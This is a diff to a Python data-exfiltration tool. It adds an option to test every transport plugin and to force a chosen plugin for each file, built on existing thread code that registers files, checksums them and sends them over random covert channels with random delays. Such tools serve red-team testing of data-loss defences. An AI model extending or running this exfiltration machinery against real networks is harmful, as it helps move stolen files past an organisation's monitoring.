@@ -270,7 +270,7 @@ class Exfiltration(object):
 
 class ExfiltrateFile(threading.Thread):
 
-    def __init__(self, exfiltrate, file_to_send):
+    def __init__(self, exfiltrate, file_to_send, plugin_name=None):
         threading.Thread.__init__(self)
         self.file_to_send = file_to_send
         self.exfiltrate = exfiltrate
@@ -278,6 +278,7 @@ class ExfiltrateFile(threading.Thread):
             string.ascii_letters + string.digits, 7))
         self.checksum = '0'
         self.daemon = True
+        self.plugin_name = plugin_name
 
     def run(self):
         # checksum
@@ -293,12 +294,16 @@ class ExfiltrateFile(threading.Thread):
         self.checksum = md5(buf)
         del file_content
         # registering packet
-        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+        if not self.plugin_name:
+            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
+        else:
+            plugin_name = self.plugin_name
+            plugin_send_function = self.exfiltrate.get_plugins()[plugin_name]['send']
         ok("Using {0} as transport method".format(plugin_name))
 
         warning("[!] Registering packet for the file")
-        data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
+        data = "%s|!|%s.%s|!|REGISTER|!|%s" % (
+            self.jobid, os.path.basename(self.file_to_send), plugin_name, self.checksum)
         plugin_send_function(data)
 
         time_to_sleep = randint(1, MAX_TIME_SLEEP)
@@ -368,6 +373,8 @@ def main():
                         dest="listen", default=False, help="Server mode")
     listenMode.add_argument('-Z', action="store_true",
                         dest="proxy", default=False, help="Proxy mode")
+    listenMode.add_argument('-T', action="store_true", 
+                        dest="test_all", default=False, help="Test all protocols")
     results = parser.parse_args()
 
     if (results.config is None):
@@ -426,10 +433,17 @@ def main():
         threads = []
         for file_to_send in files:
             info("Launching thread for file {0}".format(file_to_send))
-            thread = ExfiltrateFile(app, file_to_send)
-            threads.append(thread)
-            thread.daemon = True
-            thread.start()
+            if not results.test_all:
+                thread = ExfiltrateFile(app, file_to_send)
+                threads.append(thread)
+                thread.daemon = True
+                thread.start()
+            else:
+                for plugin_name in app.get_plugins().keys():
+                    thread = ExfiltrateFile(app, file_to_send, plugin_name)
+                    threads.append(thread)
+                    thread.daemon = True
+                    thread.start()
 
     # Join for the threads
     for thread in threads:
